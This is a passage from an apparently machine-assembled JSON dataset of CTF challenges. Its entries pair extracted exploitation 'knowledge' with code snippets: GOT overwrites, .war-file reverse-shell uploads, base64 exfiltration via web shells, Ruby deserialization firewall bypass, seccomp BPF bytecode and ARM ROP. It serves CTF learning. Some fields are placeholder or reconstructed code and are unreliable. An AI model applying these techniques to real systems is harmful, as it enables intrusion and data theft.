            "When exploiting an out-of-bounds write vulnerability, attention should be paid to the calculation involving indices. Specifically, in scenarios where a program uses an incorrect bounds check on an index that controls the write to a buffer, it can be exploited to write data beyond the intended limit of the buffer. In such cases, carefully calculating the offset needed to reach important memory structures (like a return address, a canary, or certain libc addresses) is essential. Additionally, lacking null termination can be exploited to leak information. By filling buffers in such a way that there's no null byte between your payload and the target data, you can cause the program to leak data beyond the intended buffer.\n\n    - Example payload strategy:  \n    To overflow a buffer and overwrite specific memory addresses, use carefully crafted indices and data lengths to reach and modify the parts of the stack or memory that are of interest (e.g., to leak a canary or a libc address). For instance, if the goal is to overwrite a return address or a function pointer, calculate the exact distance in bytes from the controlled buffer to that target memory address and use the appropriate index and payload size to overwrite it.",
            "Where a program contains a vulnerability that allows writing arbitrary values to arbitrary addresses (like allowing negative indexing into an array which is located near important tables such as GOT), this can be exploited to redirect code flow. This technique can be particularly effective against programs containing functions that can be overwritten to redirect execution, such as the GOT table entries for libc functions. By overwriting these entries with addresses of gadgets or system functions, an attacker can gain arbitrary code execution.\n\n    - Example payload strategy:  \n    To leak libc addresses and overwrite GOT entries with one_gadget or system addresses, carefully calculate offsets from the controlled array to the GOT and use the vulnerability to first leak addresses, calculating the base address of libc or any other relevant section. Afterward, overwrite the GOT entries of functions (e.g., `exit` or `printf`) that are called later in the program execution with the address of `one_gadget` or `system(\"/bin/sh\")`.\n    - Example to rewrite the `exit` GOT entry:  \n    ```python\n    libc_addr = leak_qword(0x4018 - 0x4080) - e.symbols[\"printf\"]\n    shoot_qword(0x4030 - 0x4080, libc_addr + 0x4526a) # overwrite exit GOT entry\n    ```"
        ],
        "key": "```c\nunsigned __int64 __fastcall writeData(char *a1)  \n{  \n unsigned int v2; // [rsp+4h] [rbp-14h]  \n unsigned __int64 v3; // [rsp+8h] [rbp-10h]\n\n v3 = __readfsqword(0x28u);  \n puts(\"Which entry to write?\");  \n v2 = 0;  \n __isoc99_scanf(\"%u\", &v2;;  \n if ( v2 <= 0xFC )  \n {  \n   puts(\"What to write?\");  \n   read(0, &a1[12 * v2], 0xCuLL);  \n }  \n return __readfsqword(0x28u) ^ v3;  \n}  \n```\n\n```c\nchar vulnbuf[1024]; // [rsp+0h] [rbp-420h]  \nint (__fastcall *func_addr)(char *, int, int); // [rsp+400h] [rbp-20h]  \n//...  \nfread(vulnbuf, 1uLL, (signed int)vullen, stdin);  \nfunc_addr(vulnbuf, vullen, v7);  \n```\n\n```c\nif ( v5 <= 31 )//v5 < 0  \n{  \n  printf(\"the value at %d is %hhd. give me a new value:\\n> \", (unsigned\nint)v5, (unsigned int)array[v5]);  \n  v3 = &v4;  \n  if ( (unsigned int)__isoc99_scanf(\"%hhd\", &v4) != 1 )  \n    break;  \n  array[v5] = v4;  \n}  \n```"
    },
    {
        "name": "In ctrl",
        "write_up": "dataset/raw/In ctrl.md",
        "type": "misc",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 200,
        "max_score": 500,
        "difficulty": 0.4,
        "knowledge": [
            "When dealing with systems vulnerable to unrestricted file upload leading to Remote Code Execution (RCE), it is effective to use crafted malicious `.war` files to gain shell access. This involves creating a `.war` file with a payload that spawns a reverse shell upon deployment and accessing it through the web application.",
            "In a situation where a specific file needs to be exfiltrated from a system with restricted access, converting the file to base64 format allows for easier copy-pasting and transfer through constrained interfaces (like web shells). This method circumvents issues that arise from binary data handling and transfer limitations."
        ],
        "key": "```java\n// Vulnerable code snippet for Unrestricted File Upload in WebCTRL system\nimport java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class UploadWarFileServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String contentType = request.getContentType();\n        if (contentType != null && contentType.startsWith(\"multipart/form-data\")) {\n            Part filePart = request.getPart(\"file\");\n            String fileName = getFileName(filePart);\n            InputStream fileContent = filePart.getInputStream();\n\n            // Vulnerable: No validation on file type or content\n            File file = new File(\"/webroot/\" + fileName);\n            try (FileOutputStream fos = new FileOutputStream(file)) {\n                int read;\n                final byte[] bytes = new byte[1024];\n                while ((read = fileContent.read(bytes)) != -1) {\n                    fos.write(bytes, 0, read);\n                }\n            }\n            response.getWriter().println(\"File uploaded successfully.\");\n        } else {\n            response.getWriter().println(\"Invalid request.\");\n        }\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n}\n```\n"
    },
    {
        "name": "Indian guessing",
        "write_up": "dataset/raw/Indian guessing.md",
        "type": "crypto",
        "competition": [
            "MidnightSun/2020/Quals",
            "https://ctftime.org/event/935/tasks/"
        ],
        "score": 76,
        "max_score": 363,
        "difficulty": 0.209366391184573,
        "knowledge": [
            "When interacting with services parsing JSON in CTF challenges, particularly when dealing with unknown binaries engaging in parsing user input, it is insightful to experiment with different types of inputs such as numbers, strings, arrays, and dictionaries. This can reveal unexpected behavior or vulnerabilities, especially when specific values trigger unique responses. This strategy is useful for understanding how the service processes different input types and can lead to discovering avenues for exploitation or gaining deeper insights into the service's operation.\n\n   **Condition:** When facing a challenge involving a service that processes JSON input.\n   \n   **Knowledge Extracted:** Experimenting with diverse input formats (numbers, strings, arrays, dictionaries) can unveil unique behaviors in how the input is parsed and handled, leading to potential discovery of vulnerabilities or hints towards solving the challenge.",
            "In challenges involving custom encryption or hashing algorithms, especially when the \"hashing\" process involves well-known algorithms like MD5 and AES in unconventional ways, a viable strategy involves reverse engineering the process to reconstruct the key or plaintext from the hash. This can be achieved by creating a lookup table for all possible combinations of input values to the hashing function and then decrypting the hash by trying all possible key combinations until a match is found in the lookup table. This approach is potent when the algorithm uses a small, predictable portion of the key for each encryption step, making brute-forcing feasible.\n\n   **Condition:** When facing a challenge that involves decrypting or breaking a custom encryption or hashing mechanism, especially one that involves known encryption or hashing algorithms applied in a non-standard configuration.\n\n   **Knowledge Extracted:** Building a lookup table of all possible input value combinations to a hashing function and attempting decryption with all possible key combinations against this table can effectively reverse-engineer custom encryption or hashing algorithms to reveal keys or plaintext.\n\n   **Sample of Payload for Building Lookup Table:**\n\n   ```python\n   def buildTable():\n       table = {}\n       for data1 in range(256):  # 0x100 hex for 256 possible byte values\n           for data2 in range(256):\n               pair = chr(data1) + chr(data2)\n               hashed = hashlib.md5(pair.encode()).hexdigest()\n               table[hashed] = pair\n       return table\n   ```\n   \n   **Sample of Payload for Trying Keys:**\n\n   ```python\n   def tryKeys(table, encryptedData):\n       for key1 in range(256):\n           for key2 in range(256):\n               thisKey = (chr(key1) + chr(key2)) * 16  # Replicating key pattern from challenge\n               cipher = AES.new(thisKey.encode(), AES.MODE_ECB)\n               try:\n                   decryptedData = cipher.decrypt(bytes.fromhex(encryptedData))\n                   if decryptedData.hex() in table:\n                       return chr(key1) + chr(key2), table[decryptedData.hex()]\n               except:  # Catch decryption errors in case of incorrect key\n                   continue\n       return None, None\n   ```"
        ],
        "key": "```python\nimport string, sys, hashlib, binascii  \nfrom Crypto.Cipher import AES  \nfrom flag import key  \nif not len(key) == 42:  \n   raise AssertionError  \ndata = open(sys.argv[1], 'rb').read()  \nif not len(data) >= 191:  \n   raise AssertionError  \nFIBOFFSET = 4919  \nMAXFIBSIZE = len(key) + len(data) + FIBOFFSET\n\ndef fibseq(n):  \n   out = [  \n    0, 1]  \n   for i in range(2, n):  \n       out += [out[i - 1] + out[i - 2]]  \n   return out\n\nFIB = fibseq(MAXFIBSIZE)  \ni = 0  \noutput = ''  \nwhile i < len(data):  \n   data1 = data[FIB[i] % len(data)]  \n   key1 = key[(i + FIB[FIBOFFSET + i]) % len(key)]  \n   i += 1  \n   data2 = data[FIB[i] % len(data)]  \n   key2 = key[(i + FIB[FIBOFFSET + i]) % len(key)]  \n   i += 1  \n   tohash = bytes([data1, data2])  \n   toencrypt = hashlib.md5(tohash).hexdigest()  \n   thiskey = bytes([key1, key2]) * 16  \n   cipher = AES.new(thiskey, AES.MODE_ECB)  \n   enc = cipher.encrypt(toencrypt)  \n   output += binascii.hexlify(enc).decode('ascii')\n\nprint(output)  \n```"
    },
    {
        "name": "Infinity Gauntlet",
        "write_up": "dataset/raw/Infinity Gauntlet.md",
        "type": "reverse",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 75,
        "max_score": 300,
        "difficulty": 0.25,
        "knowledge": [
            "When dealing with challenges that require reversing functions and calculating specific outputs, using regular expressions to parse input and output formats enables efficient extraction of known and unknown values from challenges. This technique is universally applicable in automated exploitation scripts where the input and output format is predictable but contains variable values.\n\nExample Regular Expressions for parsing:\n- For a function `foo(a, b) = c`: `foo_regex = 'foo\\((\\d*|\\?), (\\d*|\\?)\\) = (\\d*|\\?)\\n'`\n- For a function `bar(a, b, c) = d`: `bar_regex = 'bar\\((\\d*|\\?), (\\d*|\\?), (\\d*|\\?)\\) = (\\d*|\\?)\\n'`",
            "In challenges where the output of functions is influenced by XOR operations, creating inverse functions based on the analysis can be used to compute missing variables. This approach is crucial when dealing with encrypted or obfuscated data that can be systematically reversed to reveal the original content. The concept of implementing reverse operations to decrypt or decode information is a fundamental technique in tackling reverse engineering and cryptographic CTF challenges.\n\n Example of inverse functions for `foo` and `bar` based on XOR and addition/subtraction operations:\n ```python\ndef foo1(b, c):\n   return c ^ 0x539 ^ (b + 1)\n\ndef bar1(b, c, d):\n   return -((c + 1) * b) + d\n```"
        ],
        "key": "```c\nvoid read_flag() {\n    FILE *file = fopen(\"flag.txt\", \"r\");\n    if (file == NULL) {\n        perror(\"fopen\");\n        exit(1);\n    }\n    char flag[30];\n    fread(flag, 1, 30, file);\n    fclose(file);\n    for (int i = 0; i < 30; i++) {\n        flag[i] ^= (i * 0x11);\n    }\n}\n```"
    },
    {
        "name": "Inorder",
        "write_up": "dataset/raw/Inorder.md",
        "type": "misc",
        "competition": [
            "Defcamp/2020",
            "https://ctftime.org/event/1182/tasks/"
        ],
        "score": 308,
        "max_score": 972,
        "difficulty": 0.3168724279835391,
        "knowledge": [
            "In challenges involving data structures such as binary trees, an imbalance in the tree can be exploited to create a side-channel timing attack. To exploit this, one can insert a large number of nodes with identical values to create a long linear branch, which significantly increases the time required for operations like search.",
            "For challenges that involve timing attacks to deduce information, using a script to automate sending inputs and measuring response times can identify when a condition changes (e.g., when finding a character in a flag). This can be more effective than binary search in unreliable network conditions, instead utilizing a linear search to observe the transition from quick to slow responses to infer the correct value.\n\nExample payload snippet for exploiting the binary tree imbalance:\n```python\npayload = \"/a \" + (';'.join(['exploit_value' for _ in range(2047)]))\n```"
        ],
        "key": "```python\nclass Node:\n    def __init__(self, key):\n        self.left = None\n        self.right = None\n        self.val = key\n\ndef insert(root, key):\n    if root is None:\n        return Node(key)\n    else:\n        if root.val < key:\n            root.right = insert(root.right, key)\n        else:\n            root.left = insert(root.left, key)\n    return root\n\ndef search(root, key):\n    if root is None or root.val == key:\n        return root\n    if root.val < key:\n        return search(root.right, key)\n    return search(root.left, key)\n\ndef inorder(root):\n    if root:\n        inorder(root.left)\n        print(root.val)\n        inorder(root.right)\n\nr = Node(50)\nr = insert(r, 30)\nr = insert(r, 20)\nr = insert(r, 40)\nr = insert(r, 70)\nr = insert(r, 60)\nr = insert(r, 80)\n\ninorder(r)\n```"
    },
    {
        "name": "Insanity check",
        "write_up": "dataset/raw/Insanity check.md",
        "type": "forensics",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": 470,
        "max_score": 500,
        "difficulty": 0.94,
        "knowledge": [
            "When encountering CTF challenges with a large block of text containing seemingly random words or phrases, closely examine them for patterns or anomalies. Such anomalies might hint towards hidden messages or clues. In the given scenario, the anomaly was the out-of-pattern phrase \"something hidden in the rules\", which was a direct clue to look for hidden information within a specific context (the rules).",
            "In challenges that suggest the presence of hidden messages or data within text or numeric sequences, consider the possibility of encoding or encryption. When provided with a series of numbers that do not immediately make sense within the context of the challenge (such as resembling Unix timestamps but not fitting the expected context), utilize online tools or algorithms to attempt decoding. In this instance, the numbers were successfully decoded using a specific tool and the RSA Decimal algorithm, revealing parts of the flag. This approach reinforces the importance of experimentation with various decoding techniques and tools."
        ],
        "key": "```python\ndef hidden_message_extraction(rules):\n    hidden_message = \"\"\n    for rule in rules:\n        number = int(rule.split(\".\")[0])\n        decoded_char = decode_rsa_decimal(number)\n        hidden_message += decoded_char\n    return hidden_message\n\ndef decode_rsa_decimal(number):\n    # Simulate decoding of RSA Decimal\n    # This is a placeholder for the actual decoding logic\n    return chr((number % 26) + 97)  # Simplified example\n\nrules = [\n    \"107122414347637. rule 1\",\n    \"125839376402043. rule 2\",\n    \"122524418662265. rule 3\",\n    \"122549902405493. rule 4\",\n    \"121377376789885. rule 5\"\n]\n\nhidden_message = hidden_message_extraction(rules)\nprint(hidden_message)\n```"
    },
    {
        "name": "insecure_seccomp",
        "write_up": "dataset/raw/insecure_seccomp.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 205,
        "max_score": 500,
        "difficulty": 0.41,
        "knowledge": [
            "When dealing with seccomp (Secure Computing Mode) in kernel challenges, modifying kernel behavior by commenting out specific checks or security features can significantly alter the interaction with syscall filters, especially if the challenge involves manipulating privilege levels or syscall responses. This approach hinges on understanding the kernel's default behavior and security mechanisms, particularly how they manage privileges and syscall filtering. If a challenge provides the means to modify kernel behavior or if the provided kernel is already modified, one should pay close attention to changes in security-related code, as they might hint at the intended exploitation path.",
            "To exploit BPF (Berkeley Packet Filter)-based syscall filtering mechanisms, especially in scenarios where seccomp applies filters to syscalls, creating a custom BPF filter that modifies syscall behavior (such as causing a syscall to fail or return a specific error) can be an effective strategy. This requires detailed knowledge of the BPF architecture, including the formats of `sock_filter` and `sock_fprog` structures. Tools like seccomp-tools can assist in generating BPF bytecode, which can be used to manipulate the program's execution flow, such as forcing a syscall to return an error, thereby enabling further exploitation paths, such as privilege escalation or bypassing security checks. This technique is highly useful in CTF challenges that involve interacting with or within a restricted or specially configured kernel environment.\n\nExample BPF bytecode to make `faccessat` syscall fail with error number 5:\n```\n5  \n0020 00 00 00000000  \n0015 00 01 0000010d  \n0006 00 00 00050005  \n0006 00 00 7fff0000  \n0006 00 00 00000000  \n```\nThis payload, when properly injected into a vulnerable or specially prepared application or environment, causes the `faccessat` syscall to always \"fail\" with an errno of 5, facilitating privilege escalation or other exploit vectors by subverting normal security checks."
        ],
        "key": "```c\nint main(int argc, char *argv[])  \n{  \n       if (setgid(1)) {  \n               perror(\"setgid\");  \n               return 1;  \n       }\n\n       if (setgroups(0, NULL)) {  \n               perror(\"setgroups\");  \n               return 1;  \n       }\n\n       if (setuid(1)) {  \n               perror(\"setuid\");  \n               return 1;  \n       }\n\n       putchar('\\n');  \n       system(\"/usr/bin/resize > /dev/null\");  \n       execl(\"/bin/sh\", \"sh\", NULL);\n\n       perror(\"execl\");  \n       return 1;  \n}  \n```\n\n```c\nint main(int argc, char *argv[])  \n{  \n       if (!faccessat(AT_FDCWD, \"/flag\", R_OK, AT_EACCESS)) {  \n               fprintf(stderr, \"You can't be root to execute this! ... or can you?\\n\");  \n               return 1;  \n       }\n\n       setuid(geteuid());\n\n       execl(\"/bin/sh\", \"sh\", NULL);  \n       perror(\"execl\");  \n       return 1;  \n}  \n```\n\n```c\nint main(int argc, char *argv[])  \n{  \n       unsigned short num_insns;  \n       struct sock_filter *insns;  \n       struct sock_fprog prog;\n\n       if (argc < 2) {  \n               fprintf(stderr, \"Usage: %s [command]\\n\", argv[0]);  \n               exit(1);  \n       }\n\n       if (scanf(\"%hu\", &num_insns) != 1)  \n               goto bad_format;\n\n       insns = calloc(num_insns, sizeof(*insns));  \n       if (!insns)  \n               perror_exit(\"calloc\");\n\n       for (int i = 0; i < num_insns; i++) {  \n               if (scanf(\" %hx %hhx %hhx %x\",  \n                         &insns[i].code,  \n                         &insns[i].jt,  \n                         &insns[i].jf,  \n                         &insns[i].k) != 4)  \n                       goto bad_format;  \n       }\n\n       prog.len = num_insns;  \n       prog.filter = insns;\n\n       if (seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog))  \n               perror_exit(\"seccomp\");\n\n       execv(argv[1], &argv[1]);  \n       perror_exit(\"execv\");\n\nbad_format:  \n       fprintf(stderr, \"Bad format\\n\");  \n       return 1;  \n}  \n```"
    },
    {
        "name": "Inspector Gadget",
        "write_up": "dataset/raw/Inspector Gadget.md",
        "type": "pwn",
        "competition": [
            "BSidesTLV/2021",
            "https://ctftime.org/event/1403/tasks/"
        ],
        "score": 450,
        "max_score": 500,
        "difficulty": 0.9,
        "knowledge": [
            "When facing deserialization vulnerabilities in Ruby applications, if direct exploitation paths are blocked or certain objects are filtered by a firewall, one can seek alternative gadget chains that bypass these restrictions. These alternative gadget chains may involve finding and using different Ruby classes that are not blocked and can trigger arbitrary code execution. For instance, if classes like `Gem::Requirement` or `Gem::DependencyList` are blocked, alternative objects with suitable methods (`marshal_load`, invoking `each` or similar iterable method on unmarshaled objects) should be considered. Classes such as `OpenStruct`, combined with manipulable objects like `CSV::Row`, can be utilized to craft payloads that circumvent the firewall and execute arbitrary code.",
            "In scenarios where an application firewall blocks certain suspicious strings or class names, manipulating the serialized object to include mandatory strings while avoiding the inclusion of blocked class names or strings is crucial. This can involve adding specific strings to the payload (e.g., 'DynamicLog@type@level@message') to meet firewall validation requirements without including directly filtered objects. This strategy is effective in bypassing firewalls designed to prevent deserialization attacks based on the presence or absence of certain strings or class names within the serialized data.\n\nExample payload crafting in Ruby deserialization scenarios (simplified version for illustrating the approach, may not directly apply):\n```ruby\nclass OpenStruct\n def marshal_dump\n    row = CSV::Row.new([\"A\"], [\"B\"])\n    row.instance_variable_set('@row', 'payload_trigger')\n    row\n end\nend\n\npayload = OpenStruct.new()\nserialized_payload = Base64.encode64(Marshal.dump(payload)).gsub(/\\n/,'')\nputs serialized_payload\n```\nThe 'payload_trigger' part should be replaced with the actual payload aiming to exploit the target system, crafted according to the application's context and the intended exploitation path."
        ],
        "key": "```ruby  \n#!/usr/bin/env ruby  \n# frozen_string_literal: true\n\nrequire 'csv'  \nrequire 'json'  \nrequire 'base64'\n\nclass DynamicLog  \n def initialize(level, message, type)  \n   @level = level  \n   @message = message  \n   @type = type  \n end\n\n def log  \n   obj = { :level => @level, :message => @message }  \n   message =  \n     case @type  \n     when 'json'  \n       JSON.dump obj  \n     when 'csv'  \n       CSV.generate do |csv|  \n         csv << obj.keys  \n         csv << obj.values  \n       end  \n     else  \n       \"[#{@level}] #{@message}\"  \n     end  \n   puts message  \n end  \nend\n\nclass Gem::Requirement  \n def marshal_load(array) end  \nend\n\ndef firewall(input)  \n %w[DynamicLog @type @level @message].each do |word|  \n   return true unless input.include? word  \n end\n\n %w[  \n   Gem::Requirement Gem::DependencyList Gem::Requirement  \n   Gem::StubSpecification Gem::Source::SpecificFile  \n   ActiveModel::AttributeMethods::ClassMethods::CodeGenerator  \n   ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy  \n ].each do |word|  \n   return true if input.include? word  \n end  \n false  \nend\n\ndef main  \n puts %(  \n     ###                                                            #####  \n      #  #    #  ####  #####  ######  ####  #####  ####  #####     #     #   ##   #####   ####  ###### #####  \n      #  ##   # #      #    # #      #    #   #   #    # #    #    #        #  #  #    # #    # #        #  \n      #  # #  #  ####  #    # #####  #        #   #    # #    #    #  #### #    # #    # #      #####    #  \n      #  #  # #      # #####  #      #        #   #    # #####     #     # ###### #    # #  ### #        #  \n      #  #   ## #    # #      #      #    #   #   #    # #   #     #     # #    # #    # #    # #        #  \n     ### #    #  ####  #      ######  ####    #    ####  #    #     #####  #    # #####   ####  ######   #  \n  )  \n log =\n'BAhvOg9EeW5hbWljTG9nCDoLQGxldmVsSSIJSU5GTwY6BkVUOg1AbWVzc2FnZUkiDE1lc3NhZ2UGOwdUOgpAdHlwZUkiCGNzdgY7B1Q='  \n puts \"Please insert log object in base64 format (for example '#{log}'):\"  \n serialized_object = Base64.decode64 gets  \n is_blocked = firewall serialized_object  \n puts  \n return puts 'Blocked By The Application Firewall' if is_blocked\n\n Marshal.load(serialized_object).log rescue nil  \nend\n\nmain\n```"
    },
    {
        "name": "Intergalactic Cinema",
        "write_up": "dataset/raw/Intergalactic Cinema.md",
        "type": "web",
        "competition": [
            "SpaceHeroes/2024",
            "https://ctftime.org/event/2254/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When faced with ciphertext accompanied by a letter/number mapping, it is highly probable the encryption method used is a substitution cipher. One effective initial approach is to use an online solver to partially decrypt the text, which could lead to insights for further manual decryption effort.",
            "For manual decryption of a substitution cipher where the online solver fails to map some characters correctly, create a script that maps known letter or number translations. Incrementally update the mapping by examining the semi-deciphered output for recognizable patterns or missing letters in partially deciphered words, using these insights to refine the cipher mapping. A systematic approach involves:\n   - Maintaining a dictionary mapping of deciphered characters.\n   - Using a script to apply the mapping, taking care to preserve spaces and punctuation.\n   - Iteratively refining the mapping as more characters are correctly identified, often through context clues or by identifying patterns corresponding to common words or phrases.\n\nExample Payload:\n\n```py\nknown_chars = {  \n   'f': 't', \n   'r': 'h', \n   'q': 'e',  \n   ...  # continue mapping other characters as identified  \n}\n\nwith open('ct.txt', 'r') as file:  \n   for line in file:  \n       line_out = ''  \n       for char in line:  \n           if char in known_chars:  \n               line_out += known_chars[char]  \n           elif char in [' ', '!', ',', ':', '.', \"'\", '\"', '#', '?', '-', '_', '{', '}']:  \n               line_out += char  \n           elif char == '\\n':  \n               line_out += '\\n'  \n           else:  \n               line_out += '$'  \n       print(line_out)  \n```"
        ],
        "key": "```python\nknown_chars = {  \n   'f': 't',  \n   'r': 'h',  \n   'q': 'e',  \n   'd': 'r',  \n   'w': 'a',  \n   '8': 'n',  \n   '7': 'o',  \n   's': 's',  \n   '2': 'u',  \n   'm': 'c',  \n   'r': 'h',  \n   '3': 'i',  \n   'z': 'g',  \n   'b': 'b',  \n}\n\nwith open('ct.txt', 'r') as file:  \n   out = ''  \n   for line in file:  \n       for char in line:  \n           if char in known_chars.keys():  \n               out += known_chars[char]  \n           elif char == ' ':  \n               out += ' '  \n           elif char in ['!', ',', ':', '.', \"'\", '\"', '#', '?', '-', '_', '{', '}']:  \n               out += char  \n           elif char == '\\n':  \n               out += '\\n'  \n           else:  \n               out += '$'\n\nprint(out)  \n```"
    },
    {
        "name": "Investigation Continues",
        "write_up": "dataset/raw/Investigation Continues.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 936,
        "max_score": 1000,
        "difficulty": 0.936,
        "knowledge": [
            "When investigating Windows systems for forensic analysis, especially to determine the timestamp of specific user activities, various plugins within the Volatility framework can be invaluable. If the regular plugin for reading event logs (`evtlogs`) fails, alternative data sources such as registry keys can be used. Specifically, the last failed login attempt timestamp can be extracted from bytes 40-47 of the `F` value in the user key under `SAM\\Domains\\Account\\Users\\[User ID]`. This timestamp follows the Windows FILETIME format, which counts the number of 100-nanosecond intervals since January 1, 1601 (UTC). To convert this to a human-readable format, the value needs to be converted from hexadecimal to seconds, and adjusted from the FILETIME epoch to the Unix epoch.\n\n```python\nimport time\ndef to_seconds(hex_str):\n   return float(int(hex_str, 16))/1e7 - 11644473600\n# Example usage for timestamp 'e8 0b 82 34 07 60 d6 01'\ntimestamp = \"01d6600734820be8\"\nprint(time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(to_seconds(timestamp))))\n```",
            "To identify when specific files were last accessed, such as a JPEG file, the `printkey` plugin of Volatility can be used to inspect the `RecentDocs` registry keys. These keys contain records of recently accessed documents, including file names and timestamps. This method can be particularly useful for determining when a user last opened a file, which could be critical in forensic investigations. The registry key of interest for JPEG files, for instance, is located at `Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.jpg` within the user's `NTUSER.DAT` file. To accurately interpret the binary data stored in these keys, forensic analysts need familiarity with the structure of Windows registry data and the specific registry key formats used to track recent documents.\n\n```bash\n# Using Volatility to read RecentDocs registry key for JPEG files\nvolatility -f memory_dump.img --profile=WinProfile printkey -K \"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.jpg\"\n```"
        ],
        "key": "```python\nimport time\n\ndef to_seconds(h):\n    s = float(h) / 1e7  # convert to seconds\n    return s - 11644473600  # number of seconds from 1601 to 1970\n\ntimestamp = 0x01d6600734820be8\nprint(time.asctime(time.gmtime(to_seconds(timestamp))))\n```"
    },
    {
        "name": "Invisible Maze",
        "write_up": "dataset/raw/Invisible Maze.md",
        "type": "misc",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 956,
        "max_score": 1000,
        "difficulty": 0.956,
        "knowledge": [
            "When handling an encrypted string within a binary challenge, closely examine the binary for printable strings that reference key processes or outputs (like a congratulations message) that might clue you into the location of encryption or decryption routines within the program. This method can be particularly effective when static analysis tools like Ghidra are unable to automatically reference all parts of the binary.",
            "For binary challenges that involve custom encryption or encoding schemes, if the algorithm uses a small enough keyspace (e.g., two bytes), a brute-force approach can be viable. Crafting a Python script to iterate through possible key values and apply the suspected decryption formula can lead to the extraction of plaintext data, such as flags, if part of the flag format is known (e.g., 'inctf' in the flag).\n   \n   Example payload: \n   ```python\n   data = \"<encrypted_string>\".replace(\" \", \"\").decode(\"hex\")\n   for plus in range(256):\n       for x in range(256):\n           res = \"\".join([chr(((ord(c) + plus) ^ x) & 0xff) for c in data])\n           if '<known_flag_part>' in res:\n               print(plus, x, res)\n   ```"
        ],
        "key": "```c\nvoid flag_print(byte param_1,byte param_2)  \n{  \n byte index_00;  \n short index;  \n byte bStack0005;  \n  \n index = 0;  \n while ((bStack0005 ^ 0x80) < 0x80 || (byte)((bStack0005 ^ 0x80) + 0x80) <\n(index_00 < 0x1d)) {  \n   DAT_c1a0 = (undefined)((ushort)(&KRUHZ= + index) >> 8);  \n   DAT_c19f = (&KRUHZ=)[index] + param_1;  \n   (&decrypted_flag)[index] = param_2 ^ DAT_c19f;  \n   index = index + 1;  \n }  \n (&decrypted_flag)[index] = 0;  \n FUN_1658(\"Way to go! \\n flg if u not noob: %s\\n\",&decrypted_flag);  \n return;  \n}  \n```"
    },
    {
        "name": "IoT Grill",
        "write_up": "dataset/raw/IoT Grill.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 497,
        "max_score": 497,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting stack-based buffer overflows in ARM firmware, it is useful to identify functions that manipulate user input without proper bounds checking. Specifically, if a function decodes base64 input into a fixed-size buffer without verifying that the decoded size will not exceed the buffer, it introduces a buffer overflow vulnerability. This can be exploited by crafting a payload that overwrites the return address on the stack to redirect execution flow.\n   \n   Example Payload (Base64-encoded): `B64:<base64_encoded_payload>`",
            "In ARM architecture, especially when dealing with THUMB mode, it's crucial to remember that the least significant bit (LSB) of the address to which control is transferred must be set. This indicates THUMB mode execution. When constructing a Return-Oriented Programming (ROP) chain on ARM, ensure to or (`|`) the addresses of the gadgets and functions with 1 to maintain correct execution mode.\n\n   Example ROP gadget usage: `const POPR0 = 0x00001458 | 1;`"
        ],
        "key": "```c\nchar  *string;\nsize_t size;\nsize_t clearSize;\nchar   buffer[0x24];\n\nprintk(\"Enter a new device key> \");\nstring = readString();\nsize   = strlen(string);\n\nif(0 == strncmp(string, \"B64:\", 4)) {\n\t/* Don't write, but calculate the size and write in in clearSize */\n\tb64_decode(NULL, 0, &clearSize, string + 4, size - 4);\n\n\t/* Decode into buffer */\n\tb64_decode(buffer, clearSize, &clearSize, string + 4, size - 4);\n} else {\n\t/* ... */\n}\n```"
    },
    {
        "name": "IR",
        "write_up": "dataset/raw/IR.md",
        "type": "reverse",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with obfuscated or undocumented code, particularly in lesser-known languages or formats, it's often effective to manually reverse-engineer the code into a more familiar language or format for analysis. This approach was used with LLVM code, translating it into C++ to understand its operation. This involves understanding each instruction's function and effect on the data, then replicating those operations in the target language.\n\n   Example strategy:\n   - Identify unfamiliar code or data manipulation routines.\n   - Research each operation to understand its purpose and effect.\n   - Reimplement the routine in a well-understood language, keeping the logic intact.",
            "In a challenge involving encrypted or obscured strings where the manipulation process is known (in this case, a specific sequence of XOR and addition operations), you can reverse the process starting from the last known value (typically a null terminator for C strings) and work backward through the manipulation logic to retrieve the original string. This technique is effective when you have the final output and know the operations applied to each character or byte.\n\n   Sample Python reverse logic:\n   ```python\n   def reverse_logic(encoded_string):\n       output = \"\"\n       last = 0  # Assuming the last byte is known and is 0 (null terminator)\n       for character in reversed(encoded_string):\n           for i in range(32, 127):  # Printable ASCII range\n               if ((i + 5) ^ (last + 5)) == ord(character):\n                   output += chr(i)\n                   last = i\n                   break\n       return output[::-1]  # Reverse the string to get the original order\n   ```"
        ],
